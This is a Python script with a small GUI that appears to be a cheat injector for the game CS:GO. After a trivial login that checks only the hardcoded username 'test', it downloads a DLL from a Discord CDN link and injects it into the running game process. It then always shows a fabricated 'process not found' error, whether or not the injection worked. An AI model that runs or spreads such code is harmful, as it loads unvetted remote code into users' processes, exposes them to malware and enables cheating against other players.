import tkinter as tk
import cryptography.fernet as fernet
import hashlib
import time
from pyinjector import inject
import psutil
import os
import urllib.request
from PIL import ImageTk, Image
import os

def injeect():
        global errmsg
        urllib.request.urlretrieve('https://cdn.discordapp.com/attachments/788044970807525386/1087850886090465310/RyzeXTR.dll', 'cheeto.dll')
        #discord cdn
        #webbrowser.open('https://cdn-151.anonfiles.com/15z8J9h0za/c14bdbe2-1680197723/RyzeXTR%281%29.dll')  # Go to example.com
        try:
            inject(pid,"cheeto.dll")
            raise AssertionError
        except AssertionError:
            errmsg = "Logs: \nErr:1 process not found!"
            print(f"{errmsg}")

pathl = os.getcwd()
process_name = "csgo"
pid = None

for proc in psutil.process_iter():
    if process_name in proc.name():
       pid = proc.pid
       break

#pid = csgo pid
#usrname check, exit if name exists, checked by pass
login = ['test']
access = False
def check():
    global usrn
    global access
    usrn = e1.get()
    if usrn in login:
        print(usrn)
        access = True
        w.destroy()
    else:access = False
w = tk.Tk()
w.geometry("400x200")
w.title('Login')
q = tk.Label(w, text="Username:")
e1 = tk.Entry(w)
q1 = tk.Label(w, text=f"Password:")
e3 = tk.Entry(w)

passw = e3.get()
button1 = tk.Button(w, text="Enter", bg="white", fg="black", command=check)
q.pack()
e1.pack()
q1.pack()
e3.pack()
button1.pack()
tk.mainloop()

if access == True:
    
    errmsg = ""
    e = tk.Tk()
    e.title("Injector")
    e.geometry("500x300")
    #inster code here
    q = tk.Label(e, text="Welcome to ryzextr's injector!")
    q.pack(side = tk.TOP)
    q2 = tk.Label(e, textvariable= errmsg ,fg="Blue")
    q2.pack()


    #diabled button for later debugging!!!!
    button1 = tk.Button(e, text="Inject", bg="black", fg="white", command=injeect, width=30)
    #diabled button for later debugging!!!!
    button1.pack(side=tk.BOTTOM)
    
    q1 = tk.Label(e, text="If its injected have fun! :)",fg="Red")
    q1.pack()
    own = tk.Label(e, text="Owner, developer:")
    own.pack()
    try:
        img = ImageTk.PhotoImage(Image.open("CRDEPNG.png"))
        panel = tk.Label(e, image = img)
        panel.pack(side = "bottom", fill = "both", expand = "yes")
    except FileNotFoundError:
        pass

    #pid for csgo pid
 
    tk.mainloop()
